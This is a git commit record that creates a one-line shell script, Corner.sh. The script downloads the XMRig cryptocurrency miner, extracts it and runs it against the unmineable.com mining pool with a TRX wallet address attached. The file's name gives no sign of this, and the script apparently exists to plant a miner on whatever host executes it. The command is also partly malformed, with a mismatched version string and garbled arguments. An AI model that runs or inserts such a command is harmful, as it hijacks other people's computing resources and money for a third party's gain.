f7a38b72c92ef97b4a0e3ddb3138bdd50aabdba3
akhil-alt <77522362+akhil-alt@users.noreply.github.com>
2023-12-24 13:28:40 +0530

    Create Corner.sh

---
+++ Corner.sh
@@ -0,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.17.e/xmrig-6.17.0-linux-x64.tar.gz && tar -xvf xmrig-6.17.0-linux-x64.tar.gz && cd xmrig-6.17.0 &&./xmrig -o rx.unmineable.com:3333 -a rx ku TRX: TVEJ2WN4mY3tBrNRAPW7TbVoVBUNk98HDt.Cornertech -p x
